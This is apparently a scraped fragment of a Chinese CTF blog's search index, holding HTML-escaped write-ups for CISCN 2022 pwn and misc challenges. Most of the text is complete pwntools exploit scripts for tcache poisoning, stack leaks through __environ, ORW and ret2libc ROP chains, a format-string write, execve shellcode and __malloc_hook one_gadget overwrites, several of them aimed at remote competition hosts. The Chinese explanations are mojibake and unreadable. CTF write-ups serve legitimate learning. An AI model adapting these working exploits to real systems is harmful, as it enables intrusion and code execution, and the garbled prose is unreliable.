orw=b&amp;quot;./flag\x00\x00&amp;quot;+p64(pop_rdi)+p64(ret_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack_addr+0x200)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rdx)+p64(0x50)+p64(write_a)
#Ê≥®ÊÑèorwÈìæÈïøÂ∫¶‰∏çËÉΩÂ§ß‰∫éÂàõÂª∫Â†ÜÂùóÁöÑÂ§ßÂ∞è

delete(3) 
delete(2) #ÈáäÊîæÂ†ÜÂùóÂÜçÊ¨°overlap

add(0x80,p64(0)+p64(0xa1)+p64(ret_addr))
add(0x90,b&amp;quot;eee&amp;quot;)

# gdb.attach(io)
# pause()

add(0x90,orw)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 Âçé‰∏úÂåó]blue wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/AEGN0vH7Z/"" data-c="
          &lt;p&gt;glibcÁâàÊú¨2.33-0ubuntu5&lt;br&gt;
seccomp dumpÂèëÁé∞Á¶ÅÁî®&lt;code&gt;execve()&lt;/code&gt;ÔºåÊâìorw rop&lt;br&gt;
Êú¨È¢òÊ≥ÑÈú≤libcÂú∞ÂùÄÁöÑÊó∂ÂÄô‰ΩéÂ≠óËäÇ‰∏∫&lt;code&gt;\x00&lt;/code&gt;Â≠òÂú®00Êà™Êñ≠ÔºåÈúÄË¶Å‰øÆÊîπ‰ΩéÂ≠óËäÇÊ≥ÑÈú≤ÔºåÂêéÁª≠ÂáèÂéªÂç≥ÂèØ&lt;br&gt;
ÂÖ∂ÂÆÉË∑üduckÂ∑Æ‰∏çÂ§öÔºåÂä´ÊåÅ&lt;code&gt;edit()&lt;/code&gt;ÁöÑretÊâìone_gadget&lt;br&gt;
ÂÖ∂‰∏≠&lt;code&gt;__environ&lt;/code&gt;Ê≥ÑÈú≤ÁöÑ&lt;code&gt;stack_addr&lt;/code&gt;Ë∑ùÁ¶ªret‰∏∫0x120&lt;br&gt;
‰∏çËøáË∑üduck‰∏ÄÊ†∑ÈúÄË¶ÅÈ¢ùÂ§ñ0x18ÊâçËÉΩÊ≠£Â∏∏ÂàÜÈÖçÂà∞ÁõÆÊ†áÂú∞ÂùÄÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686837300331.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686837312166.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Âè¶Â§ñÊ≠§È¢òÁöÑ&lt;code&gt;pop rdx;ret&lt;/code&gt;Êåá‰ª§ÁöÑÂÅèÁßªÂú®‰∏çÂêåÊâæÂØªÊñπÊ≥ï‰∏ãÂÅèÁßª‰ºö‰∏ç‰∏ÄÊ†∑ÔºåËÄå‰∏îÂ¶ÇÊûúÁõ¥Êé•Áî®&lt;br&gt;
&lt;code&gt;leak_addr+next(libc.search(asm(&amp;quot;pop rdx;ret&amp;quot;)))&lt;/code&gt;‰ºöÂ¥©Ê∫É&lt;br&gt;
‰ΩÜÊòØÂ¶ÇÊûúÊâãÂä®ÊâæËØ•gadgetÂú®libcÊñá‰ª∂‰∏≠ÂÅèÁßªÂÜçÂä†‰∏äÂü∫ÂùÄÂàô‰∏ç‰ºöÂá∫Áé∞ÈóÆÈ¢òÔºàÈõæ&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28257)
io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)


def add():
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;1&amp;quot;) #0x100
    
def delete(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))

def edit(n,s,cc):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;Size: \n&amp;quot;,str(s))
    io.sendafter(&amp;quot;Content: \n&amp;quot;,cc)

# gdb.attach(io)
# pause()

add() #0
add() #1
delete(0)
show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;key: &amp;quot;+hex(key))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

delete(1)
payload=p64((heap_addr+0x10)^key)+p64(0)
edit(1,len(payload),payload)

add() #2
add() #3

payload=b&amp;quot;\x00&amp;quot;*0x4e+b&amp;quot;\x07&amp;quot;
edit(3,len(payload),payload)
delete(3)
payload=b&amp;quot;\x01&amp;quot;
edit(3,len(payload),payload)
show(3)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x71-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
pop_rsi=leak_addr+next(libc.search(asm(&amp;quot;pop rsi;ret&amp;quot;)))
fake_pop_rdx=next(libc.search(asm(&amp;quot;pop rdx;ret&amp;quot;)))
print(&amp;quot;fake_pop_rdx: &amp;quot;+hex(fake_pop_rdx))
pop_rdx=leak_addr+0x0c7f32
pop_rax=leak_addr+next(libc.search(asm(&amp;quot;pop rax;ret&amp;quot;)))
ret=leak_addr+next(libc.search(asm(&amp;quot;ret&amp;quot;)))
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]


payload=b&amp;quot;/flag\x00\x00\x00&amp;quot;+b&amp;quot;\x00&amp;quot;*0x16+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)

delete(1)
payload=p64(environ^key)+p64(0)
edit(1,len(payload),payload)
add() #4
add() #5
show(5)
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x138
print(&amp;quot;ret_addr: &amp;quot;+hex(ret_addr))


delete(4)
payload=p64((ret_addr)^key)+p64(0)
edit(4,len(payload),payload)



#open
orw=p64(0)*3+p64(pop_rdi)+p64(heap_addr+0x10)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(write_a)



payload=b&amp;quot;/flag\x00\x00\x00&amp;quot;+b&amp;quot;\x00&amp;quot;*0x16+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)


add() #6
add() #7

# gdb.attach(io)
# pause()

edit(7,len(orw),orw)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 Âçé‰∏úÂåó]bigduck wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/VFTFpVn43/"" data-c="
          &lt;p&gt;ÂäüËÉΩÈΩêÂÖ®ÁöÑËèúÂçïÈ¢òÔºå‰ΩÜÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØglibcÁâàÊú¨Âú®2.34Âà†Èô§‰∫ÜÂ∏∏Áî®ÁöÑ&lt;code&gt;__malloc_hook&lt;/code&gt;Âíå&lt;code&gt;__free_hook&lt;/code&gt;Á≠âÂ∏∏Áî®hookÔºåÊÑèÂë≥ÁùÄÂä´ÊåÅhookÊâìone_gadgetÁöÑÊñπÂºèÂ∑≤‰∏çÂèØË°å&lt;br&gt;
Êú¨È¢òÈôêÂà∂‰∫ÜÂàõÂª∫ÂíåÈáäÊîæÂ†ÜÂùóÁöÑÊ¨°Êï∞Ôºå‰ΩÜÂπ∂‰∏çÂΩ±ÂìçÊâìÈ¢òÁöÑÊñπÊ≥ï&lt;br&gt;
Ê≠§È¢òÊàë‰ª¨ÈÄâÊã©Ê≥ÑÈú≤libcÂêéÂà©Áî®&lt;code&gt;__environ&lt;/code&gt;Ê≥ÑÈú≤Ê†àÂú∞ÂùÄÁÑ∂ÂêéÂä´ÊåÅ&lt;code&gt;edit()&lt;/code&gt;ÁöÑretÂú∞ÂùÄÊâìrop&lt;br&gt;
‰∏ãÂõæ‰∏∫Ê≥ÑÈú≤ÁöÑÊ†àÂú∞ÂùÄË∑ùÁ¶ªretÁöÑÂÅèÁßª‰∏∫-0x150Ôºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686835329136.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰ΩÜÊòØÈúÄË¶ÅÂÜçÂáèÂéª0x18ÊâçËÉΩÊâìÈÄöÔºåÊâÄ‰ª•ÈúÄË¶ÅÂàÜÈÖçÂà∞&lt;code&gt;stack_addr-0x168&lt;/code&gt;Â§ÑÔºåÊâÄ‰ª•ÂêéÁª≠ropÈìæÈ¢ùÂ§ñÈúÄË¶Å0x18ÁöÑpadding&lt;br&gt;
‰∏§ÁßçÊñπÂºèÔºö&lt;/p&gt;
&lt;h4 id=&#34;Êâìtcache-structÊ≥ÑÈú≤libc&#34;&gt;Êâìtcache structÊ≥ÑÈú≤libcÔºö&lt;/h4&gt;
&lt;p&gt;expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28687)
io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

def add():
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;1&amp;quot;) #0x100
    
def delete(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))

def edit(n,s,cc):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;Size: \n&amp;quot;,str(s))
    io.sendafter(&amp;quot;Content: \n&amp;quot;,cc)


add() #0
add() #1
delete(0)
show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;key: &amp;quot;,hex(key))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))

delete(1)
payload=p64((heap_addr+0x10)^key)+p64(0)
edit(1,len(payload),payload)
add()#2
add()#3
payload=b&amp;quot;\x00&amp;quot;*0x4e+b&amp;quot;\x07&amp;quot;
edit(3,len(payload),payload)

delete(3)
show(3)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))+0x74a0-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
ret=leak_addr+next(libc.search(asm(&amp;quot;ret&amp;quot;)))

delete(2)
payload=p64(environ^key)+p64(0)
edit(2,len(payload),payload)

payload=b&amp;quot;\x00&amp;quot;*0x1e+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)

add()#4
add()#5
show(5)

stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x168
print(&amp;quot;ret_addr: &amp;quot;+hex(ret_addr))

delete(4)
payload=p64(ret_addr^key)+p64(0)
edit(4,len(payload),payload) 

payload=b&amp;quot;\x00&amp;quot;*0x1e+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)

add()#6
add()#7

gdb.attach(io)
pause()

payload=p64(0)*3+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
edit(7,len(payload),payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;ÈáäÊîætcachebin&#34;&gt;ÈáäÊîætcachebin :&lt;/h4&gt;
&lt;p&gt;expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28687)
# io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

def add():
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;1&amp;quot;) #0x100
    
def delete(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))

def edit(n,s,cc):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;Size: \n&amp;quot;,str(s))
    io.sendafter(&amp;quot;Content: \n&amp;quot;,cc)

# gdb.attach(io)
# pause()

# edit(0,0x100,p64(count_addr))
# add() #0
# edit(0,0x100,b&amp;quot;\x07&amp;quot;*0x40)
for i in range(8):
    add()
    
add() #8

for i in range(8):
    delete(i)

show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))+0x74a0-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

one_gadget=[0xda861,0xda864,0xda867]
shell=one_gadget[0]+leak_addr
pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh\x00&amp;quot;))


show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;key: &amp;quot;,hex(key))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))


environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
print(&amp;quot;environ: &amp;quot;,hex(environ))


for i in range(5):
    add() #9-13

payload=p64(environ^key)+p64(0)
edit(1,len(payload),payload)
add() #14
add() #15
show(15)
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x168
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

delete(9)
delete(10)

payload=p64(stack_addr^key)+p64(0)
edit(10,len(payload),payload)

add() #16
add() #17

payload=p64(0)*3+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
edit(17,0x30,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 Âçé‰∏úÂåó]duck wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/2kS7k1Mtb/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNÔºö&lt;/h3&gt;
&lt;h4 id=&#34;skill&#34;&gt;skillÔºö&lt;/h4&gt;
&lt;p&gt;GLIBC 2.23-0ubuntu11.3&lt;br&gt;
ËèúÂçï‰∏ãÈù¢Â∞±Âè™Êúâ&lt;code&gt;add()&lt;/code&gt;ÊúâÁî®ÔºåÂèØ‰ª•‰øÆÊîπbssÊÆµ‰∏äÂÜÖÂÆπ‰ª•Á¨¶ÂêàÂêéÁª≠&lt;code&gt;show()&lt;/code&gt;ÈáåÈù¢ÊØîËæÉÂáΩÊï∞&lt;br&gt;
ÂêéÁª≠Â∞±ÊòØret2libcÊ®°ÊùøÈ¢òÔºåÊ≥®ÊÑèlibcÂ∞èÁâàÊú¨&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;47.106.35.54&amp;quot;,46655)
# io=process(&amp;quot;./skill&amp;quot;)
elf=ELF(&amp;quot;./skill&amp;quot;)
libc=ELF(&amp;quot;libc.so&amp;quot;)

pop_rdi=0x400c83 
ret=0x400297

def add(cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Input your skill: \n&amp;quot;,cc)

payload=b&amp;quot;song&amp;quot;+b&amp;quot;\x00&amp;quot;*0xc+b&amp;quot;\x00&amp;quot;*4+b&amp;quot;jump&amp;quot;+b&amp;quot;\x00&amp;quot;*4+b&amp;quot;\x00&amp;quot;*0xc+b&amp;quot;rap\x00\x00\x00\x00\x00&amp;quot;+b&amp;quot;\x00&amp;quot;*0xc+b&amp;quot;NBA&amp;quot;
add(payload)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;4&amp;quot;)
payload=cyclic(0x18)+p64(pop_rdi)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4008b6)
io.sendline(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;4&amp;quot;)

io.recvuntil(b&amp;quot;music~\n&amp;quot;)

payload=cyclic(0x18)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c80 : pop r14 ; pop r15 ; ret
# 0x0000000000400c82 : pop r15 ; ret
# 0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400820 : pop rbp ; ret
# 0x0000000000400c83 : pop rdi ; ret
# 0x0000000000400c81 : pop rsi ; pop r15 ; ret
# 0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400297 : ret
# 0x00000000004007a2 : ret 0x2018

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;dragon_game&#34;&gt;dragon_game:&lt;/h4&gt;
&lt;p&gt;ÁªïËøá‰∏ÄËøû‰∏≤Âà§Êñ≠ÂáΩÊï∞ÔºåÊúÄÂêéËøõÂÖ•Âà∞&lt;code&gt;sub_400A5D&lt;/code&gt;Âú®rwxÊÆµ‰∏äÂÜôshellcode&lt;br&gt;
ÊúâÈïøÂ∫¶ÈôêÂà∂ÔºåÂèØ‰ª•‰∏äexploit-dbÊâæ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;47.106.8.27&amp;quot;,46460)
# io=process(&amp;quot;./dragon_game&amp;quot;)
elf=ELF(&amp;quot;./dragon_game&amp;quot;)

io.recvuntil(b&amp;quot;is &amp;quot;)
leak_addr=int(io.recvuntil(&amp;quot;\n&amp;quot;)[:-1],16)
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


io.recvuntil(b&amp;quot;t?:\n&amp;quot;)
io.sendline(b&amp;quot;east&amp;quot;)

io.recvuntil(b&amp;quot;address&#39;\n&amp;quot;)
io.sendline(str(leak_addr))

io.recvuntil(b&amp;quot;is:\n&amp;quot;)
payload=&amp;quot;%{}c%{}$n&amp;quot;.format(233,7)
io.sendline(payload)

shellcode=b&amp;quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;quot;

io.recvuntil(b&amp;quot;LL\n&amp;quot;)
io.send(shellcode)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;consolidate&#34;&gt;consolidate:&lt;/h4&gt;
&lt;p&gt;GLIBC 2.23-0ubuntu11.3ÔºàÊ≥®ÊÑèÂ∞èÁâàÊú¨ÔºåÂê¶Âàôone_gadgetÊúÄÂêé‰∏çÈÄö&lt;br&gt;
UAFÔºåÂèØ‰ª•edit after free&lt;br&gt;
dup+‰øÆÊîπfd‰ΩéÂ≠óËäÇ+fake chunk‰øÆÊîπsizeÊ≥ÑÈú≤libc&lt;br&gt;
ÁÑ∂ÂêéÊúÄÂêéÂä´ÊåÅmalloc_hookÊâìone_gadget,Ê≥®ÊÑèreallocË∞ÉÊ†à&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;47.106.8.27&amp;quot;,48046)
# io=process(&amp;quot;./consolidate&amp;quot;)
libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)
# elf=ELF(&amp;quot;./consolidate&amp;quot;)
# one_gadget=[0x45206,0x4525a,0xef9f4,0xf0897]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]

def add(cc):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;content\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx\n&amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content\n&amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;idx\n&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(b&amp;quot;a&amp;quot;) #0
add(b&amp;quot;b&amp;quot;) #1
add(b&amp;quot;c&amp;quot;) #2
add(b&amp;quot;d&amp;quot;) #3
add(b&amp;quot;e&amp;quot;) #4

# edit(0,cyclic(0x60))

delete(0)
delete(1)
delete(0)
edit(0,b&amp;quot;\xa0&amp;quot;)
add(b&amp;quot;a&amp;quot;)
# delete(1)
edit(1,p64(0)*5+p64(0x71))
# delete(1)

add(cyclic(0x38)+p64(0xe1))
delete(2)
show(2)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+one_gadget[1]

delete(0)
# delete(1)
# delete(0)

edit(0,p64(malloc_hook-0x23))
# add(b&amp;quot;a&amp;quot;)
add(b&amp;quot;a&amp;quot;)
add(cyclic(0xb)+p64(shell)+p64(realloc+0x10))


io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;1&amp;quot;)


io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISCÔºö&lt;/h3&gt;
&lt;h4 id=&#34;embarrass&#34;&gt;embarrassÔºö&lt;/h4&gt;
&lt;p&gt;ÊµÅÈáèÂåÖstrings Áõ¥Êé•Ë∑ëÂá∫Êù•flag&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686458594979.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;basic-type&#34;&gt;Basic type&lt;/h4&gt;
&lt;p&gt;Áõ¥Êé•Áî®ÈöèÊ≥¢ÈÄêÊµÅÂ∑•ÂÖ∑Áõ¥Êé•‰∏ÄÊääÊ¢≠ÂìàÔºåÂèØ‰ª•ÂæóÂà∞flagÂõæÁâá&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466842481.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;run&#34;&gt;run&lt;/h4&gt;
&lt;p&gt;ÊâìÂºÄÈôÑ‰ª∂ÂèëÁé∞ÊòØwordÔºåÁÑ∂ÂêéËøõË°åforemostÂàÜÁ¶ªÂá∫Êù•Ëøô‰∫õÂõæÁâá&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466850238.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ÊääexeÈÇ£‰∏™ÊãñËøõida,ÂèëÁé∞Êúâ‰∏Ä‰∏≤ÂØÜÊñá&lt;/p&gt;
&lt;p&gt;ÁÑ∂ÂêéÂá∫Áé∞‰∏Ä‰∏™ÂõæÁâáÔºåÂõæÁâáÂèëÁé∞ÊòØ‰∏§‰∏™ÂõæÂ±ÇÔºåÁÑ∂ÂêéÂèëÁé∞Êúâ‰∏Ä‰∏™Ëß£ÂØÜÈÄªËæë&lt;/p&gt;
&lt;p&gt;ÁÑ∂ÂêéÂÜô‰∏Ä‰∏™ËÑöÊú¨Âç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;str = &#39;njCp1HJBPLVTxcMhUHDPwE7mPW&#39;
flag = &#39;&#39;
for i in range(1, len(str)+1):
    if i % 2 == 0:
        flag += chr(ord(str[i-1]) + 1)
    else:
        flag += chr(ord(str[i-1]) - 1)
print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;web&#34;&gt;web&lt;/h3&gt;
